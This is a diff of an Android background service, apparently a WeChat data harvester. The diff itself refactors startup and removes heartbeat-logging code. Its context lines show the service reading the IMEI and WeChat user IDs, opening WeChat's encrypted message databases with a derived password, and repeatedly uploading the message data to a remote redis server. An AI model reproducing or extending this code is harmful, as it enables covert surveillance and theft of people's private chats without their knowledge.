@@ -87,13 +87,20 @@ public class GohnsonService extends Service {
     HashMap<String, String> mapUIN = new HashMap<String, String>();
 
     @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        LogInputUtil.e(TAG, "GohnsonService 启动");
-        initIMEI();
-        MyLog.init(MyApplication1.getApp().getCacheDir().getPath());
-
+    public void onCreate() {
+        super.onCreate();
+        initBaseContnet();
+    }
+    public void initBaseContnet(){
+        LogInputUtil.e(TAG, "GohnsonService 启动 onCreate");
         CrashReport.initCrashReport(getApplicationContext(), GlobalCofig.BUGLY_ID, GlobalCofig.BUGLY_ISDEBUG);
+        MyLog.init(MyApplication1.getApp().getCacheDir().getPath());
+        initIMEI();
+    }
 
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        LogInputUtil.e(TAG, "GohnsonService 存在， 触发onStartCommand");
         try {
             if (Build.VERSION.SDK_INT < 18) {
                 startForeground(GOHNSON_ID, new Notification());
@@ -114,7 +121,6 @@ public class GohnsonService extends Service {
             UploadAsyncTask asyncTask = new UploadAsyncTask();
             asyncTask.execute();
         }
-
     }
 
 
@@ -130,7 +136,6 @@ public class GohnsonService extends Service {
         String deviceid = gson.toJson(devInfoDao);
 
         UploadManager.getInit().deviceHeartBeat(deviceid);
-
     }
 
 
@@ -139,33 +144,15 @@ public class GohnsonService extends Service {
 
     public void timekeeping() {
         if (mTimerTask != null) return;
-
-        final long startTime = System.currentTimeMillis();
         mTimerTask = new TimerTask() {
             public void run() {
-                long endTime = System.currentTimeMillis();
-                long existTime = (endTime - startTime) / 1000;
-
                 executeUpload();
-
-                isWriteHeartBeatLog(existTime);
-              //  pushHearBeat();
             }
         };
         mTimer.schedule(mTimerTask, 0, GlobalCofig.EXECUTE_HEARBEAT_INTERVAL);//多少秒执行一次
 
     }
 
-    public void isWriteHeartBeatLog(long existTime) {
-        long isWrite = existTime % GlobalCofig.WRITE_HEARBEAT_TIME;
-        if (isWrite == 0) {
-            GlobalCofig.isWriteHearbeat = true;
-        } else {
-            GlobalCofig.isWriteHearbeat = false;
-        }
-        LogInputUtil.e(TAG, "服务存在时长 = " + existTime + ",是否写心跳日志 = " + GlobalCofig.isWriteHearbeat);
-
-    }
 
     //EXECUTE_SERVICE_INTERVAL 时间间隔内不重复执行操作
     public boolean isExecuteUploadService() {
@@ -245,7 +232,7 @@ public class GohnsonService extends Service {
 
             GetFiles(GlobalCofig.OPERATION_DIR, GlobalCofig.WX_DATA_DB, true);
             // GetFiles(GlobalCofig.OPERATION_DIR_0, GlobalCofig.WX_DATA_DB, true);
-            //GetFiles(GlobalCofig.OPERATION_DIR_11, GlobalCofig.WX_DATA_DB, true);;
+            //GetFiles(GlobalCofig.OPERATION_DIR_11, GlobalCofig.WX_DATA_DB, true);
             //  GetFiles(GlobalCofig.OPERATION_DIR_PARALLEL_LITE, GlobalCofig.WX_DATA_DB, true);
         } catch (Exception e) {
             MyLog.inputLogToFile(TAG, "异常 UploadWXData = " + e.getMessage());
@@ -347,7 +334,7 @@ public class GohnsonService extends Service {
                             dataTarget = SQLiteDatabase.openOrCreateDatabase(dbFile.getPath(), mDbPassword, null, hook);
                             uploadOperation(dataTarget, f, pathUin, wxIMEI, fileChangeTime);
                         } catch (Exception e) {
-                            String exceptionStr = "异常 ：读取数据库信息失败" + e.getMessage().toString() + ",filePath = " + (dbFile == null ? "" : dbFile.getPath());
+                            String exceptionStr = "异常 ：上传数据信息失败:" + e.getMessage().toString() + ",filePath = " + (dbFile == null ? "" : dbFile.getPath());
                             MyLog.inputLogToFile(TAG, exceptionStr);
                         } finally {
                             if (dataTarget != null)
@@ -571,7 +558,7 @@ public class GohnsonService extends Service {
             long lastUploadTime = ShareData.getInstance().getLongValue(this, lastUploadTimeStr, 0);
             ShareData.getInstance().saveLongValue(this, lastUploadTimeStr, lastUploadTimeTemporary);
 
-            MyLog.inputLogToFile(TAG, key + "message数据有更新， 新时间为= " + lastUploadTimeTemporary + ",旧时间 = " + lastUploadTime + ",pushValue = " + pushValue + ",filePath = " + file.getPath());
+            MyLog.inputLogToFile(TAG, key + "：redis 上传成功 ，message数据有更新， 新时间为= " + lastUploadTimeTemporary + ",旧时间 = " + lastUploadTime + ",pushValue = " + pushValue + ",filePath = " + file.getPath());
             return true;
         } catch (Exception e) {
             MyLog.inputLogToFile(TAG, key + ":redis 连接失败, errMsg = " + e.getMessage());
